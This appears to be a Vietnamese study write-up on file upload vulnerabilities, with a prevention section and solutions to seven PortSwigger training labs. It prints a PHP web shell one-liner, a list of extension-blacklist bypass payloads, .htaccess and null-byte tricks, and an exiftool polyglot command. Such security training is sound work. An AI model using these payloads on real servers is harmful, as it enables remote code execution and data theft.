# File upload vulnerabilities

![image](https://hackmd.io/_uploads/HyW46nXi6.png)

## Khái niệm & Khai thác & Phòng tránh

### Khái niệm

- nếu chức năng upload cho phép chúng ta upload bất kì file nào lên hệ thống (nằm ngoài thiết kế logic ban đầu) thì đây là lỗi
  - giả sử, chức năng Upload Avatar (_.png, _.jpg) cho phép upload _.html, _.php thì đây là lỗi. _.html, _.php là file không mong muốn

Giả sử, một hệ thống được xây dựng dựa trên ngôn ngữ PHP, cho phép người dùng upload các file định dạng php và có thể thực thi những file này. Khi đó, thay vì upload một file avatar, kẻ tấn công có thể tải lên một tệp có phần mở rộng .php, sau đó truy cập đường dẫn thư mục chứa tệp đã tải lên khiến hệ thống thực thi các lệnh trong tệp này. Cơ ché gần giống với locla file inclusion + upload

![image](https://hackmd.io/_uploads/r1mVDYXjT.png)

- nếu chúng ta có thể upload webshell, nó có thể đọc được mã nguồn (vi phạm tính bảo mật), xóa được file (vi phạm tính toàn vẹn), làm chậm hoặc tắt hệ thống (vi phạm tính sẵn sàng)
- nếu không giới hạn dung lượng Upload, hacker có thể làm tràn dung lượng ổ cứng và khiến máy chủ không thể hoạt động ( vi phạm tính sẵn sàng)
- nếu không upload được webshell, hacker có thể upload các file HTML hoặc SVG chứa javascript độc hại để đánh cắp thông tin quan trọng của người dùng thực thi XSS (vi phạm tính bảo mật)
- Kẻ tấn công thường lợi dụng lỗ hổng File upload để xây dựng cho mình các Webshell, từ đó chiếm quyền hệ thống hoặc thu thập các thông tin, dữ liệu nhạy cảm.
- Các trường hợp phổ biến như:
  - Không xác thực `file's type`: Đây là trường hợp xấu nhất của file upload vulnerabilities. Hệ thống cho phép tải lên tệp với định dạng bất kỳ. Trong trường hợp này, kẻ tấn công có thể tải lên các tệp độc hại (.php, .jsp) hoạt động như webshell, từ đó toàn quyền kiểm soát server.
  - Không xác thực `file's name`: Kẻ tấn công có thể ghi đè lên các tệp quan trọng của hệ thống bằng cách tải lên các tệp cùng tên.
  - Không xác thực `file's size`: Kẻ tấn công có thể chiếm dụng hết disk space, từ đó tấn công DoS.
- để check 1 file có phải là PNG không:
  - check tên file (trong tên file có extension)
  - Content-Type ở phía HTTP request
  - Content of file: phía backend sẽ viết code để mở file đó kiểm tra định dạng nội dung của file có phải PNG không ở 2 byte đầu có là `FF D8` không. Một cách khác nữa, server có thể dựa vào kết quả của hàm getimagesize() trong PHP để xem kích thước ảnh để chống Dos.

### Khai thác

- Lỗ hổng chạy Script file upload xảy ra khi thỏa mãn những điều kiện sau:
  - Lỗ hổng chạy Script file upload xảy ra khi thỏa mãn những điều kiện sau:
  - Có thể upload các file script

filter có thể ở frontend hoặc backend hoặc cả 2 nên chúng ta cần bypass qua chúng

![image](https://hackmd.io/_uploads/S17bYp7sa.png)

vì file php không quan tâm 1 file nó là loại file gì mà chỉ cần biết bên trong nó có phần `<?php` và `?>` cùng với code php là nó thực thi nên chúng ta có thể nhét webshell vào metadata của 1 ảnh bằng công cụ exiftool

![image](https://hackmd.io/_uploads/HJ7FLOXj6.png)

![image](https://hackmd.io/_uploads/Hytv9d7jT.png)

trong apache có 1 file là .htaccess cho phép chúng ta cấu hình 1 website mà không làm ảnh hưởng đến các website khác trên server và không cần reboot lại server với quyền admin. Lợi dụng điều đó chúng ta sẽ thay đổi file này để server xử lý code php ngay cả khi không có phần mở rộng là ".php"

![image](https://hackmd.io/_uploads/SJLrFOXsa.png)

lợi dụng .htaccess yêu cầu apache nhận dạng \*.cookie cũng là loại file php

![image](https://hackmd.io/_uploads/Hk5pYdXiT.png)

và sau đó chúng ta có thể upload file webshell ".cookie" để server thực thi code php của chúng ta như bình thường

- Kẻ tấn công có thể tải lên các tệp có chứa mã độc hoặc thực thi mã trên server bằng cách tải lên các tệp có đuôi phù hợp với định dạng được chấp nhận bởi ứng dụng web. Để khai thác lỗ hổng upload file, kẻ tấn công có thể tải lên một trong các tệp sau đây:

  - Tệp chứa mã độc, chẳng hạn như mã JavaScript hoặc PHP, sẽ được thực thi khi được tải lên server.
  - Tệp tin nén, chứa mã độc hoặc file khác, được giải nén bởi ứng dụng web.
  - Tệp tin hình ảnh hoặc video chứa mã độc được giấu trong phần dữ liệu bổ sung.

- Một số cách bypass lỗ hổng upload file bao gồm:
  - Thay đổi đuôi tệp tin để vượt qua các kiểm tra định dạng tệp
  - Sử dụng các kỹ thuật mã hoá để che giấu mã độc trong các tệp khác như tệp hình ảnh
  - Sử dụng các kỹ thuật để tránh các giới hạn dung lượng tệp tin.
  - Hacker có thể có thể đổi đuôi extension thành shell.php1 ,shell.php2 ,shell.php3 ,... Và thậm chí shell vẫn có thể chạy với các đuôi như .pl hoặc .cgi
  - Nếu tất cả các đuôi bạn thử đều đã nằm trong danh sách đen, chúng ta có thể check xem bộ lọc có phân biệt chữ hoa chữ thường không : shell.Php1, shell.PHP2 ,....
  - Đôi khi ,nhà phát triển có thể tạo 1 regex kiểm thử .jpg ,vì vậy chúng ta có thể thử cách chồng extension như là shell.jpg.php
  - Tuy nhiên , nếu tất cả các bước trên đều thất bại , thì chúng ta vẫn còn 1 khả năng cuối cùng để tải shell lên bằng cách sử dụng `.htaccess` file. Tập tin .htaccess (hypertext access) là một file có ở thư mục gốc của các hostting và do apache quản lý, cấp quyền. File .htaccess có thể điều khiển, cấu hình được nhiều thứ với đa dạng các thông số, nó có thể thay đổi được các giá trị được set mặc định của apache.
  - Một null byte trong các URL được đại diện bởi ‘00%’, trong ASCII là một ” ” (giá trị null ) trong quá trình lây nhiểm . Phần sau %00 sẽ được hiểu là giá trị null , là giá trị kết thúc của chuỗi nên tệp được tải lên với tên là shell.php: `shell.php%00.jpg`
  - Bypass using Double Extension: chúng ta có thể sử dụng shell.php.jpg,shell.php;.jpg,shell.php:jpg để thực thi lệnh shell , nhưng lổ hỗng này, thường là do cấu hình của webserver hoặc hệ điều hành
  - Ngoài ra , vẫn còn 1 số lỗi từ phía máy chủ như là nếu chúng ta sử dụng extension .test thì hệ điều hành sẽ không nhận ra . Cho nên chúng ta có thể tải lên tệp shell.php.test và hệ điều hành sẽ bỏ qua .test và thực thi shell
  - Bypass the blacklisting defense

```!
phtml
php
php3
php4
php5
inc
pHtml
pHp
pHp3
pHp4
pHp5
iNc
iNc%00
iNc%20%20%20
iNc%20%20%20...%20.%20..
iNc......
inc%00
inc%20%20%20
inc%20%20%20...%20.%20..
inc......
pHp%00
pHp%20%20%20
pHp%20%20%20...%20.%20..
pHp......
pHp3%00
pHp3%20%20%20
pHp3%20%20%20...%20.%20..
pHp3......
pHp4%00
pHp4%20%20%20
pHp4%20%20%20...%20.%20..
pHp4......
pHp5%00
pHp5%20%20%20
pHp5%20%20%20...%20.%20..
pHp5......
pHtml%00
pHtml%20%20%20
pHtml%20%20%20...%20.%20..
pHtml......
php%00
php%20%20%20
php%20%20%20...%20.%20..
php......
php3%00
php3%20%20%20
php3%20%20%20...%20.%20..
php3......
php4%00
php4%20%20%20
php4%20%20%20...%20.%20..
php4......
php5%00
php5%20%20%20
php5%20%20%20...%20.%20..
php5......
phtml%00
phtml%20%20%20
phtml%20%20%20...%20.%20..
phtml......
```

#### Khai thác lỗ hổng File Upload với Race Conditions

- Race condition xảy ra khi hai hoặc nhiều tiến trình cùng truy cập vào một tài nguyên và thực hiện các thao tác trên tài nguyên đó mà không được đồng bộ hóa đúng cách. Khi đó, kết quả của các thao tác này có thể không đúng hoặc không như mong đợi
- Chức năng upload file hiện nay đều có khả năng chống lại các cuộc tấn công file upload tốt. Thay vì trực tiếp lưu file vào thư mục, chúng ta có thể đặt file upload vào một nơi "tạm thời", thay đổi tên file, xử lý qua các bước kiểm tra, khi xác định đó là một tệp thực sự an toàn thì mới lưu vào thư mục chính.
- Tuy nhiên, bước xử lý kiểm tra tệp tin tải lên vẫn cần tới một khoảng thời gian nhất định, và tại thời điểm file cũ "chưa kịp" xử lý xong, kẻ tấn công tải lên một file mới, thì file mới này sẽ được lưu trữ tạm thời và trong trạng thái hàng đợi để chờ xử lý. Chúng ta có thể lợi dụng sơ hở này thực hiện tấn công, cách khai thác này có tên gọi là Race conditions attack.
- ví dụ như hệ thống cho chúng ta upload file ảnh lên và xử lý xong sẽ xóa luôn đồng thời đổi tên file để chúng ta khó có thể truy cập vào file chúng ta đã tải lên. Vậy làm cách nào mà chúng ta đọc được file webshell mà chúng ta đã upload. mình đã tham khảo ở bài đăng này https://sec.vnpt.vn/2023/05/exploiting-file-upload-vulnerability-with-race-conditions-challenge-for-you/

#### Khai thác lỗ hổng tải lên tệp mà không cần thực thi mã từ xa

- chúng ta có thể tải lên các tập lệnh phía máy chủ để thực thi mã từ xa. Đây là hậu quả nghiêm trọng nhất của chức năng tải file không an toàn lên nhưng những lỗ hổng này vẫn có thể bị khai thác theo những cách khác.
- Tải lên các tập lệnh phía máy khách độc hại:
- Mặc dù bạn có thể không thực thi được các tập lệnh trên máy chủ nhưng bạn vẫn có thể tải lên các tập lệnh để tấn công phía máy khách. Ví dụ: nếu bạn có thể tải lên tệp HTML hoặc hình ảnh SVG, bạn có thể sử dụng `<script>`thẻ để tạo tải trọng XSS được lưu trữ .
- Nếu sau đó tệp đã tải lên xuất hiện trên một trang được người dùng khác truy cập, trình duyệt của họ sẽ thực thi tập lệnh khi nó cố gắng hiển thị trang. Lưu ý rằng do các hạn chế trong chính sách cùng nguồn gốc , các kiểu tấn công này sẽ chỉ hoạt động nếu tệp đã tải lên được cung cấp từ cùng nguồn mà bạn tải tệp đó lên.

#### Tải tệp lên bằng PUT

- Cần lưu ý rằng một số máy chủ web có thể được cấu hình để hỗ trợ PUTcác yêu cầu. Nếu không có biện pháp phòng vệ thích hợp, điều này có thể cung cấp một phương tiện thay thế để tải lên các tệp độc hại, ngay cả khi chức năng tải lên không khả dụng qua giao diện web.
- Bạn có thể thử gửi OPTIONSyêu cầu đến các điểm cuối khác nhau để kiểm tra xem có bất kỳ thông báo hỗ trợ nào cho PUTphương thức này không.

#### Khai thác lỗ hổng trong phân tích cú pháp các tệp được tải lên

- Nếu tệp đã tải lên có vẻ vừa được lưu trữ vừa được phân phát an toàn thì biện pháp cuối cùng là thử khai thác các lỗ hổng cụ thể đối với việc phân tích cú pháp hoặc xử lý các định dạng tệp khác nhau. Ví dụ: bạn biết rằng máy chủ phân tích cú pháp các tệp dựa trên XML, chẳng hạn như Microsoft Office .dochoặc .xlscác tệp, đây có thể là vectơ tiềm ẩn cho các cuộc tấn công tiêm nhiễm XXE.

### Phòng tránh

- **Tách nội dung tải lên**: Dùng các dịch vụ lưu trữ đám mây hoặc hệ thống quản lý nội dung để lưu trữ các tệp đã tải lên hoặc cần có khả năng ghi các tệp đã tải lên vào cơ sở dữ liệu của mình. Việc lưu trữ các tệp đã tải lên trên một máy chủ tệp hoặc trong một phân vùng đĩa riêng biệt cũng có ích, cô lập thiệt hại tiềm ẩn mà một tệp độc hại khả năng gây ra ra.
- **Giới hạn quyền của thư mục** . Tức là tệp được tải lên sẽ không có bất kì quyền **"thực thi"** nào đối với ứng dụng,website và tự động loại bỏ nếu có
- **Đảm bảo không thể thực thi tệp tải lên**: Máy chủ web phải có quyền đọc và ghi trên các thư mục được dùng để lưu trữ nội dung đã tải lên, nhưng không thể thực thi bất kỳ tệp nào ở đó.
- **Đổi tên tệp tải lên**: khiến attacker khó xác định được tệp độc hại sau khi chúng được tải lên. Thay đổi tên tệp do người dùng tải lên kết hợp che giấu đường dẫn thư mục: Một số trường hợp người dùng bypass upload file thành công và truy cập tới tệp upload, nhưng không thể thực thi đã tên đã bị thay đổi thành các chuỗi ký tự ngẫu nhiên. Ngoài ra, cần loại bỏ null byte trong file name.
- **Xác thực định dạng tệp và tiện ích mở rộng**
- **Xác thực Content-Type**
- **Dùng trình quét vi-rút**
- **Giới hạn kích thước file tải lên đề phòng DoS như đã nêu ở trên**

![image](https://hackmd.io/_uploads/HJbvoa7oa.png)

## 1. Lab: Remote code execution via web shell upload

link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

### Đề bài

![image](https://hackmd.io/_uploads/Syna4sVs6.png)

### Phân tích

- Trang web chứa lỗ hổng Upload File trong chức năng upload ảnh, nó không thực hiện bất kì bước kiểm tra nào đối với file do người dùng tải lên. Để giải quyết bài lab, chúng ta cần upload một Webshell PHP, từ đó đọc nội dung tệp /home/carlos/secret. Tài khoản hợp lệ được cung cấp: `wiener:peter`.
- Đăng nhập với tài khoản `wiener:peter`, trang cá nhân chứa chức năng upload ảnh đại diện
- mình Upload một file ảnh bình thường rồi sau đó sẽ thay đổi các header cho phù hợp với mục đích upload webshell, nó sẽ nhanh hơn là chúng ta phải tìm cách vượt qua filter ngay từ đầu:

![image](https://hackmd.io/_uploads/rkRbOs4ia.png)

![image](https://hackmd.io/_uploads/rkV56s4s6.png)

ctrl + U mình thấy đường dẫn đến file ảnh mà chúng ta đã upload

![image](https://hackmd.io/_uploads/Sy873jNja.png)

Như vậy file ảnh sau khi upload được lưu tại thư mục /files/avatars/.

### Khai thác

- Chúng ta sẽ upload một file anh.php với nội dung như sau:

![image](https://hackmd.io/_uploads/rJSc_s4jT.png)

webshell này giúp mình có thể thực thi được các lệnh trong hệ điều hành lấy từ parameter mình tạo ra là cmd trên URL

mình sửa lại trường file name là anh.php để hệ thống webserver biết đó là file thực thi php có thể chạy được và thay đổi nôị dung trong file ảnh thành payload của mình

![image](https://hackmd.io/_uploads/SkAg6s4ip.png)

hệ thống đã xác nhận upload thành công ở đây không có cơ chế filter nào

giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/ByY1k2ViT.png)

và mình đọc được thông tin bí mật là **6OV7Ug312usoVQGfOtQXtlz05p57YZlK**

mình đem đi submit và solve được lab này

![image](https://hackmd.io/_uploads/B1VSk34ip.png)

![image](https://hackmd.io/_uploads/S1rrJhViT.png)

## 2. Lab: Web shell upload via Content-Type restriction bypass

link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

### Đề bài

![image](https://hackmd.io/_uploads/ry-Zxh4sp.png)

### Phân tích

- Trang web chứa lỗ hổng file upload. Để giải quyết bài lab, chúng ta cần upload một web shell PHP nhằm đọc nội dung file /home/carlos/secret. Tài khoản hợp lệ được cung cấp `wiener:peter`.

### Khai thác

- tương tự bài trước mình cũng upload file ảnh lên và thay đổi tên file thành anh.php và sửa nội dung file ảnh thành payload: `<?php system($_GET['cmd']); ?>`

![image](https://hackmd.io/_uploads/S1Ob-hEsp.png)

hệ thống đã xác nhận upload thành công ở đây dường như backend chỉ filter dựa trên trường **Content-Type:** xem có là **image/png** không

giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/H10TbhVop.png)

và mình đọc được thông tin bí mật là **CANkMeKlZlMdBUZ2DaqaaHvQjIbqP3ee**

mình đem đi submit và solve được lab này

![image](https://hackmd.io/_uploads/Hk8WGhEoa.png)

![image](https://hackmd.io/_uploads/H1dbzhEjp.png)

## 3. Lab: Web shell upload via path traversal

link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

### Đề bài

![image](https://hackmd.io/_uploads/ByWwf3VsT.png)

### Phân tích

- Trang web chứa lỗ hổng upload file, trong đó cơ chế ngăn chặn không cho phép người dùng thực thi file. Để giải quyết bài lab, chúng ta cần vượt qua cơ chế này, khai thác lỗ hổng nhằm đọc nội dung tệp /home/carlos/secret. Tài khoản hợp lệ được cung cấp `wiener:peter`.

### Khai thác

tương tự bài trước mình cũng upload file ảnh lên và thay đổi tên file thành anh.php và sửa nội dung file ảnh thành payload: `<?php system($_GET['cmd']); ?>`

![image](https://hackmd.io/_uploads/HkgV73Eop.png)

hệ thống đã xác nhận upload thành công

- giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/BJGIEnNoT.png)

Tuy nhiên, lúc này có vẻ như server đã không thực thi code của webshell như các bài lab trên. có thể suy ra rằng, server đã cấu hình không cho thực thi code php tại thư mục upload.

- Nhưng mà chắc gì server chặn hết các thư mục khác. Mình có thể tận dụng directory traversal tại trường filename để lưu file upload vào một thư mục khác. Cụ thể, nếu filename=../exploit.php thì rất có thể file upload sẽ được lưu vào thư mục cha của thư mục upload.

![image](https://hackmd.io/_uploads/HkRdV2NiT.png)

vậy trang web đã có cơ chế ngăn chặn không cho phép người dùng thực thi file trong thư mục upload file

- Điều này cho thấy chúng ta đã upload file thành công, tuy nhiên có thể thư mục chứa file upload đang được hệ thống cài đặt để không cho phép thực thi file với định dạng php. Bởi vậy chúng ta có thể kết hợp lỗ hổng Directory traversal, mục đích để đưa file upload tới thư mục khác cho phép thực thi file php, thay đổi tên file thành ../anh.php.

![image](https://hackmd.io/_uploads/SyxKr3Vo6.png)

- , trong response trả về, dòng thông báo chỉ còn avatars/anh.php, có vẻ cơ chế ngăn chặn đã loại bỏ chuỗi ../. Chúng ta có thể bypass cơ chế này với URL encode: `..%2fanh.php`:

![image](https://hackmd.io/_uploads/B1p0SnNia.png)

Bình thường file tải lên được lưu trữ tại thư mục /files/avatars (Có thể kiểm tra bằng cách upload một hình ảnh bình thường), còn trong trường hợp này do đã "lùi" một thư mục nên file được lưu tại thư mục /files. Có thể file upload được phép thực thi ở thư mục này, truy cập đường dẫn file upload:

![image](https://hackmd.io/_uploads/S1-ULh4oT.png)

- server chỉ cấu hình cấm thực thi php tại thư mục `files/avatars/` còn `files/` thì không.
  File thực thi thành công và chúng ta có nội dung secret là **CumezgOAPvRCQ80j68A1tttZEkwOdSpy**, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/SyBPUn4ja.png)

## 4. Lab: Web shell upload via obfuscated file extension

link: https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities

### Đề bài

![image](https://hackmd.io/_uploads/SJ-DOhEsp.png)

### Phân tích

- Trang web chứa lỗ hổng upload file, trong đó có một black list các extension file. Để giải quyết bài lab, chúng ta cần vượt qua cơ chế này, khai thác lỗ hổng nhằm đọc nội dung tệp /home/carlos/secret. Tài khoản hợp lệ được cung cấp `wiener:peter`.

### Khai thác

- tương tự bài trước mình cũng upload file ảnh lên và thay đổi tên file thành anh.php và sửa nội dung file ảnh thành payload: `<?php system($_GET['cmd']); ?>`

![image](https://hackmd.io/_uploads/B1r-tn4ja.png)

    - Hệ thống chỉ cho phép file dạng JPG và PNG. Tất cả các cách bypass phía trên đều không hiệu quả, chúng ta cần nghĩ cách vượt qua black list hệ thống. Trong trường hợp này chúng ta có thể sử dụng ký tự null byte ```%00``` để vượt qua cơ chế này ( bắt đầu từ phiên bản PHP 5.3.4, ký tự Null byte đã được fix). Sử dụng tên file ```anh.php%00.png``` phần mở rộng trang web nhận được là .png không nằm trong black list, sau khi xử lý thì các ký tự bắt đầu từ ký tự Null byte được loại bỏ, tên file chỉ còn anh.php có thể thực thi.

![image](https://hackmd.io/_uploads/BkOtYnNi6.png)

hệ thống đã xác nhận upload thành công

- giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/S1kP53EiT.png)

File thực thi thành công và chúng ta có nội dung secret là **5HIkTAKG3yE5KBEvG1RRqPjwkkTronX1**, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/HywFq34jT.png)

![image](https://hackmd.io/_uploads/H1Ft5hEoT.png)

## 5. Lab: Web shell upload via extension blacklist bypass

link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

### Đề bài

![image](https://hackmd.io/_uploads/Hykm62Vo6.png)

### Phân tích

- Trang web chứa lỗ hổng upload file, trong đó có một black list các extension file. Để giải quyết bài lab, chúng ta cần vượt qua cơ chế này, khai thác lỗ hổng nhằm đọc nội dung tệp /home/carlos/secret. Tài khoản hợp lệ được cung cấp `wiener:peter`.

### Khai thác

- tương tự bài trước mình cũng upload file ảnh lên và thay đổi tên file thành anh.php và sửa nội dung file ảnh thành payload: `<?php system($_GET['cmd']); ?>`

![image](https://hackmd.io/_uploads/Hyv2anEoT.png)

hệ thống phát hiện mình up lên file php

![image](https://hackmd.io/_uploads/rkogC2Ej6.png)

mình sủ dụng tên file `anh.php%00.png` phần mở rộng trang web nhận được là .png không nằm trong black list, sau khi xử lý thì các ký tự bắt đầu từ ký tự Null byte được loại bỏ, tên file chỉ còn anh.php có thể thực thi.

- nhưng khi đọc file mình up thì lại không được và mình dùng path traversal như bài trước cũng không được

![image](https://hackmd.io/_uploads/SJEjRnEja.png)

- Lưu ý rằng chúng ta có thể tải lên nhiều file ảnh với cùng tên, và khi truy cập tới đường dẫn file upload sẽ hiển thị hình ảnh cuối cùng upload (các hình ảnh đã upload có cùng tên). Như vậy khả năng lớn hệ thống sẽ thay thế ảnh cuối cùng vào vị trí ảnh trước đó có cùng tên. Điều này dẫn đến chúng ta có thể ghi đè nội dung các file đã có.

chúng ta cũng có thể làm cách khác là ghi đè lên file .htaccess trong server Apache để có thể thực thi mã php nhưng phần mở rổng có thể khác ".php" và mình chọn ở đây là ".cuong"

mình sẽ ghi đè file .htaccess với nội dung
` AddType application/x-httpd-php .cuong`

mình đổi phần Content-Type là `text/plain` và gửi file này

![image](https://hackmd.io/_uploads/rkdoeTVip.png)

Như vậy, hiện tại chúng ta có thể upload các file với phần mở rộng .cuong và có thể thực thi các đoạn code tương đương với một file php.

![image](https://hackmd.io/_uploads/BkwXJpNja.png)

- giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/SkxzZ6Via.png)

File thực thi thành công và chúng ta có nội dung secret là **uX3Zy5hk63dcmjY0uGecyA3JK4e2DE2F**, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/SJ9rW6EiT.png)

![image](https://hackmd.io/_uploads/SkaBWTNj6.png)

## 6. Lab: Remote code execution via polyglot web shell upload

link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

### Đề bài

![image](https://hackmd.io/_uploads/rk7PMa4jT.png)

### Phân tích

- Trang web chứa lỗ hổng trong chức năng upload avatar, với nhiều cơ chế bảo vệ nhưng vẫn có thể bị bypass. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm đọc nội dung file /home/carlos/secret. Tài khoản hợp lệ được cung cấp: `wiener:peter`.

### Khai thác

- tương tự bài trước mình cũng upload file ảnh lên và thay đổi tên file thành anh.php và sửa nội dung file ảnh thành payload: `<?php system($_GET['cmd']); ?>`

![image](https://hackmd.io/_uploads/r1kI76Nja.png)

hệ thống đã xác nhận upload thành công.

- Từ đây có thể suy đoán: hệ thống thực hiện kiểm tra tệp tải lên có thỏa mãn các tính chất của một file ảnh hay không, tuy nhiên không kiểm tra phần mở rộng file cũng như Content type. Nghĩa là nếu khi chúng ta bypass được cơ chế này upload một file php thành công, hệ thống có thể sẽ thực thi file php đó.
- giờ mình chỉ cần truy cập vào file mình đã upload và thực thi shell

![image](https://hackmd.io/_uploads/H1BqQa4ia.png)

File thực thi thành công và chúng ta có nội dung secret là **PwWwUu3d7Bi5U26zaTOmHiIWcBFLjFpy**, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/SyFsmpNsa.png)

với cách làm khác:

- Ý tưởng là chúng ta có thể thực hiện chèn metadata vào file ảnh, đồng thời đổi tên với phần mở rộng .php để hệ thống thực thi. Sử dụng công cụ Exiftool, payload như sau:

```!
exiftool -Comment="<?php echo 'SECRET' . file_get_contents('/home/carlos/secret') . 'SECRET'; ?>" anh.png -o anh.php
```

![image](https://hackmd.io/_uploads/HyuKBaViT.png)

Dòng lệnh trên sẽ chèn thêm đoạn metadata vào nội dung file ảnh anh.png, output là file mới anh.php

![image](https://hackmd.io/_uploads/rJpBUTEoT.png)

- giờ mình chỉ cần truy cập vào file mình đã upload và đọc file secret

![image](https://hackmd.io/_uploads/HJq3ITVoa.png)

giờ xem ảnh, vì mình để SECRET ở 2 đầu nên ta tìm kiếm nó trong response thì đoạn ở giữa chính là scret của carlos:

- chúng ta có nội dung secret là **OXZ5cEg1JFDvQPiYTyyf5XdShPVmBRux**, submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/HkApU6Eja.png)

![image](https://hackmd.io/_uploads/ByzC8TNsp.png)

- nếu chương trình kiểm tra ảnh có bị vỡ hay bị lỗi không hiển thị được thì chúng ta dùng cách thứ hai vì nó vẫn hiển thi ra bình thường chỉ thêm phần metadata trong ảnh để thực thi mã php trong khi làm theo cách 1 ảnh sẽ bị lỗi và không hiển thị ra được

## 7. Lab: Web shell upload via race condition

link: https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities

### Đề bài

![image](https://hackmd.io/_uploads/BJT3KTNj6.png)

### Phân tích

- Lab này chứa lỗ hổng khi upload ảnh. Mặc dù nó hiện ra chức năng kiểm tra bất kì file nào được upload, nhưng ta vẫn có thể bypass hệ thống kiểm tra này bằng cách khai thác với race condition. Để solve lab thì em cần phải upload 1 file PHP shell, dùng nó để đọc nội dung của /home/carlos/secret. Mình có tài khoản của bản thân: `wiener:peter`
- Phần hint cung cấp cho chúng ta đoạn code xử lý file upload của trang web:

```php!
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

- Khi người dùng upload file, trang web lưu trữ tạm thời file upload:

```php!
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
```

Như ta có thể thấy, khi file được đẩy lên, nó sẽ được lưu tạm thời vào avatars/, sau đó trang web tiến hành check virus và check xem file đó có phải ảnh không (file type=jpg hoặc png), nếu thỏa mãn sẽ thông báo file được upload thành công, còn không thì sẽ xóa file đó đồng thời thông báo upload file thất bại

- chúng ta có thể sử dụng cách tấn công Race conditions, khai thác dựa theo time to check và time to use, cụ thể, chúng ta sẽ gửi request vào giữa hai khoảng thời gian này dẫn tới hệ thống thực thi file php khi chưa kịp xoá file (Time to use).

### Khai thác

- Đăng nhập với tài khoản wiener:peter, tải lên một file shell.php với nội dung như sau:

```php!
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Gửi request upload này tới Intrunder, chúng ta sẽ sử dụng dạng payload Null payload thực hiện tấn công Race condition.

![image](https://hackmd.io/_uploads/SyGxlA4oa.png)

![image](https://hackmd.io/_uploads/S19MgAVsp.png)

![image](https://hackmd.io/_uploads/BkSVl0EsT.png)

Tạo một cuộc tấn công thứ hai request tới /files/avatars/anh.php:

![image](https://hackmd.io/_uploads/HyAPx0VoT.png)

![image](https://hackmd.io/_uploads/S1_Fl0Nia.png)

Cho hai cuộc tấn công đồng thời bắt đầu:

![image](https://hackmd.io/_uploads/Hyg0zA4jT.png)

mình thu được response chứa nội dung file secret là **N9sMjkwRL7vaxy0mfsHVLng0AghhT2Rz**
Submit và hoàn thành bài lab:

![image](https://hackmd.io/_uploads/SkI2z0EiT.png)

![image](https://hackmd.io/_uploads/SJ6nzANi6.png)

## Chú thích

- **MIME (Multipurpose Internet Mail Extensions)** là một tiêu chuẩn được sử dụng để mô tả cách mã hóa định dạng tệp và dữ liệu khi chúng được truyền qua Internet. MIME định nghĩa các loại định dạng dữ liệu khác nhau, bao gồm văn bản, âm thanh, hình ảnh, video và các loại dữ liệu khác. Mỗi loại dữ liệu được gán một loại MIME duy nhất, được biểu diễn bằng một chuỗi văn bản có định dạng như **"type/subtype"**.
- Ví dụ, loại MIME cho hình ảnh JPEG là "image/jpeg", cho văn bản HTML là "text/html", và cho tệp âm thanh MP3 là "audio/mpeg".
- Khi một máy chủ web gửi một tệp cho một trình duyệt web, nó thường gửi loại MIME của tệp đó cùng với nó. Trình duyệt sử dụng thông tin này để hiển thị hoặc xử lý tệp một cách thích hợp.

### Xử lý tệp tĩnh

- Máy chủ sẽ phân tích đường dẫn để xác định phần mở rộng của tệp, so sánh nó với ánh xạ được cấu hình sẵn giữa phần mở rộng và loại MIME.
  ![image](https://hackmd.io/_uploads/r1yJSWrj6.png)

Xem xét cấu hình trong trang web:

- Nếu loại tệp không thể thực thi được thì ứng dụng thường trả về nội dung trong phản hồi HTTP, chẳng hạn như hình ảnh hoặc HTML.
- NẾU loại tệp có thể thực thi được nhưng ứng dụng không cho phép hoặc xử lý việc thực thi tệp, điều đó sẽ dẫn đến việc máy chủ trả về thông báo lỗi hoặc mã đơn giản trong phản hồi HTTP.
- Nếu tệp có thể thực thi được (PHP) và ứng dụng cho phép thực thi. ứng dụng thường chuyển giá trị tiêu đề hoặc truy vấn tới biến. kết quả có thể được gửi đến máy khách trong phản hồi HTTP.

**multipart/form-data** là một loại MIME được sử dụng khi gửi dữ liệu biểu mẫu từ trình duyệt web đến máy chủ thông qua phương thức POST trong HTTP.

- dữ liệu từ các trường biểu mẫu như văn bản, hình ảnh hoặc tệp đính kèm sẽ được mã hóa và gửi dưới dạng một loạt các phần riêng biệt, mỗi phần đại diện cho một trường biểu mẫu cụ thể. Mỗi phần này chứa tiêu đề để xác định tên trường và loại dữ liệu của nó.
